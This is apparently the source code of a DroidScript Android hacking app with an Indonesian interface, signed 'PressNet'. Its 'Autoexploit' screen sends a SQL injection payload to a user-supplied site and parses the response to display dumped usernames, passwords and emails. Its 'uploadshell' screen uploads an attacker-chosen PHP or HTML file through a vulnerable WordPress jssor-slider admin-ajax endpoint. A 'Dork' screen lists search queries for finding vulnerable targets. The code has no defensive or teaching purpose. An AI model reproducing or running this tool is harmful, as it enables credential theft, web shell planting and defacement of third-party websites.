app.LoadPlugin( "Lodash" )
function OnStart()
{
     lay3 = app.CreateLayout( "linear", "VCenter,FillXY" );  
    lay3.SetBackground( "/Sys/Img/StarField.jpg" );
    lay3.SetVisibility();
    lay3.SetPadding( 0, 0, 0, 0 ); 
         Y=app.CreateImage( "Img/1653119663336.png", 0.5 )
         lay3.AddChild( Y )
t1  = app.CreateButton( "uploadshell :)" , 0.6 ,0.1);
t1.SetOnTouch( r_OnTouch );    
t  = app.CreateButton( "Autoexploit :)" , 0.6 ,0.1);
t.SetOnTouch( c_OnTouch );
t2  = app.CreateButton( "Dork :)" , 0.6 ,0.1);
t2.SetOnTouch( q_OnTouch );
	txt = app.CreateText( "Created By PressNet", 0.9,0.1, "MultiLine,Center" );
	txt.SetTextSize( 12 );
	

        lay3.AddChild( t1 );
        lay3.AddChild( t );
        lay3.AddChild( t2 );
        lay3.AddChild( txt );
        app.AddLayout( lay3 );

}
function r_OnTouch(){
    O()
    
    
}
function c_OnTouch(){
    i()
    
    
}
function i()
{
	//Create a layout with objects vertically centered.
	lay = app.CreateLayout( "Linear", "VCenter,FillXY" )
lay.SetBackground( "/Sys/Img/StarField.jpg" );
	//Create a text label and add it to layout.
		edt = app.CreateTextEdit( "", 0.96, 0.1 ) 
		edt.SetHint( "masukkan alamat web target" )
	edt.SetBackColor( "black" )
	edt.SetTextColor("green")
	lay.AddChild( edt ) 
	
	btnLoad = app.CreateButton( "Load", 0.23, 0.1 ) 
	btnLoad.SetOnTouch( btnLoad_OnTouch ) 
	lay.AddChild( btnLoad )
	ty = app.CreateTextEdit("","log",0.7,0.7)
	ty.SetTextColor("green")
	lay.AddChild(ty)
	//Add layout to app.	
	app.AddLayout( lay )
}
function q_OnTouch(){
    
     lay = app.CreateLayout( "linear", "VCenter,FillXY" )  
    lay.SetBackground( "/Sys/Img/StarField.jpg" )

     //Create a text with formatting.
    var text = "<p><b>List Dork</b>  " + 
    "</p>" + 
    "<br><b>untuk upload shell:</b>" + 
    "<br> inurl:/wp-content/jssor-slider/jssor-uploads/ " +
    "<br></br>"+
    "<br><b>lokasi file</b> </br>:wp-content/jssor-slider/jssor-uploads/ScDefaceKamu.html" +
    
    "<br></br>"+
    "<br><b>untuk auto xploit</b> " + 
    "<br>inurl: statis-1-profil" + 
    "<br></br>";
    txt = app.CreateText( text, 0.8, -1, "Html,Link" )
    txt.SetMargins( 0, 0.02, 0, 0 )
    txt.SetPadding( 0.03, 0.03, 0.03, 0.03 )
    txt.SetTextSize( 20 )
    txt.SetTextColor( "#F7E273" )
    lay.AddChild( txt )
    app.AddLayout(lay)
}

function btnLoad_OnTouch() 
{ 
    e = edt.GetText()
   var address = e+"/statis-1'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username,password,email)),@)--+-profil.html";

app.HttpRequest( "GET", address, null, null, handleReply );

function handleReply( error, reply )
{
    if( error ) alert( "GAGAL : "+reply );
    else
    {
        var funfact = reply.slice( reply.indexOf("<title>") + 3, reply.indexOf("</title>") );
       // alert( funfact );
        k = _.replace(funfact,"<li>,","\nUSERNAME :\n")
 t= _.replace(k,",","\n\nPASSWORD : ")
y=_.replace(t,",","\n\nEMAIL : ")
u=_.replace(y,",","\n\nSELEBIHNYA :\n\n")
        ty.SetText(u);
    }
}
} 
function O()
{
     lay3 = app.CreateLayout( "linear", "VCenter,FillXY" );  
    lay3.SetBackground( "/Sys/Img/StarField.jpg" );
    lay3.SetVisibility();
    lay3.SetPadding( 0, 0, 0, 0 ); 
        et = app.CreateTextEdit( "", 0.8, 0.1, "Password,Singleline" );
	edt = app.CreateTextEdit( "", 0.8, 0.1, "Password,Singleline" );
    et.SetHint( "URL target Nya Bro :(" );
 
t1  = app.CreateButton( "UP Shell nya Cuy:)" , 0.6 ,0.1);
t1.SetOnTouch( t1_OnTouch );
t  = app.CreateButton( "Attack :)" , 0.6 ,0.1);
t.SetOnTouch( t_OnTouch );
	txt = app.CreateText( "Created By PressNet", 0.9,0.1, "MultiLine,Center" );
	txt.SetTextSize( 12 );
	

        lay3.AddChild( et );
        lay3.AddChild( t1 );
        lay3.AddChild( t );
        lay3.AddChild( txt );
        app.AddLayout( lay3 );

}

function OnUpload( error, file, result )
{
    if(error) app.Alert( "Gagal up Server kaya Tai!!" )
    else app.ShowPopup( url + file , "Nehh hasilnya cuy" );    
}
function t_OnTouch(){

var url = et.GetText();
    var f = ete.GetText();
   
    app.UploadFile( url+"/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library", f, null, OnUpload );
}



function t1_OnTouch()
{
    app.ChooseFile( "Choose a File", "text/html,text/php,text/phtml",OnChoose );
}

function OnChoose( file )
{
      ete = app.CreateTextEdit( file, 0.8, 0.1, );
    f= ete.GetText();
    app.ShowPopup( f );
}